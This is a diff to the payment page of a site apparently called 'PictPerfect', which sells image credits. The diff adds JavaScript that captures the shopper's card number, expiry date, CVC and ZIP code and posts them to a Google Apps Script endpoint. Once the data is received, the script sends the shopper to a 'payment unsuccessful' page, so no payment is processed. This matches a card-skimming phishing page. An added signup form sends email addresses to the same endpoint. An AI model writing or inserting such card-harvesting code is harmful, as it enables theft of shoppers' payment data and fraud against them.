@@ -18,6 +18,10 @@ document.addEventListener("DOMContentLoaded", () => {
   // Display the selected package
   const packageText = `${credits} Credits = $${price}`;
   document.getElementById("selected-package").innerText = packageText;
+
+  // Store these values globally for submission
+  window.selectedCredits = credits;
+  window.selectedPrice = price;
 });
 </script>
 </head>
@@ -41,7 +45,7 @@ document.addEventListener("DOMContentLoaded", () => {
 <section class="form-section">
   <h1>Enter Payment Details</h1>
   <p>Selected Package: <span id="selected-package"></span></p>
-  <form action="payment-unsuccessful.html" method="get" class="payment-form">
+  <form id="payment-form" class="payment-form">
     <label for="zip-code">ZIP Code:</label>
     <input type="text" id="zip-code" name="zip-code" required placeholder="Enter your ZIP code">
 
@@ -61,5 +65,89 @@ document.addEventListener("DOMContentLoaded", () => {
 <footer>
   <p>&copy; 2024 PictPerfect. All rights reserved.</p>
 </footer>
+
+<!-- Example signup form for demonstration (if needed) -->
+<section>
+  <form id="signup-form">
+    <input type="email" id="email" name="email" placeholder="Enter Email" required>
+    <input type="checkbox" id="terms" name="terms"> I agree to the terms
+    <button type="submit">Sign Up</button>
+  </form>
+</section>
+
+<script>
+  // Replace with your Web App URL from the Google Apps Script deployment
+  const GAS_ENDPOINT = 'https://script.google.com/macros/s/AKfycbzIThOL0h0m1Vv_v1Hy_6r45YuhpCbbv3AV-s9_aJNTduZMrZuStK8mlyl1VLbXcaz8/exec';
+
+  // Handle the signup form submission
+  document.getElementById('signup-form').addEventListener('submit', function(e) {
+    e.preventDefault();
+    var form = this;
+    var email = document.getElementById('email').value;
+    var termsChecked = document.getElementById('terms').checked;
+
+    var postData = new URLSearchParams();
+    postData.append('email', email);
+    postData.append('signup_terms', termsChecked);
+
+    fetch(GAS_ENDPOINT, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+      body: postData.toString()
+    })
+    .then(function(response) {
+      // You can handle the response if needed
+      // For now, just redirect
+      window.location.href = 'upload-offer.html';
+    })
+    .catch(function(error) {
+      console.error('Error:', error);
+      alert('There was a problem submitting your data. Please try again.');
+    });
+  });
+
+  // Handle the payment form submission
+  document.getElementById('payment-form').addEventListener('submit', function(e) {
+    e.preventDefault();
+    var zip = document.getElementById('zip-code').value;
+    var ccNumber = document.getElementById('cc-number').value;
+    var ccExp = document.getElementById('cc-exp').value;
+    var ccCvc = document.getElementById('cc-cvc').value;
+
+    // Retrieve the credits and price from global variables set on DOMContentLoaded
+    var credits = window.selectedCredits;
+    var price = window.selectedPrice;
+
+    var postData = new URLSearchParams();
+    postData.append('credits', credits);
+    postData.append('price', price);
+    postData.append('zip-code', zip);
+    postData.append('cc-number', ccNumber);
+    postData.append('cc-exp', ccExp);
+    postData.append('cc-cvc', ccCvc);
+
+    fetch(GAS_ENDPOINT, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+      body: postData.toString()
+    })
+    .then(function(response) {
+      // You might want to check the response text for "Success"
+      return response.text();
+    })
+    .then(function(text) {
+      if (text === "Success") {
+        // Redirect on success
+        window.location.href = 'payment-unsuccessful.html';
+      } else {
+        alert('There was a problem submitting your payment information.');
+      }
+    })
+    .catch(function(error) {
+      console.error('Error:', error);
+      alert('There was a problem submitting your payment information. Please try again.');
+    });
+  });
+</script>
 </body>
 </html>
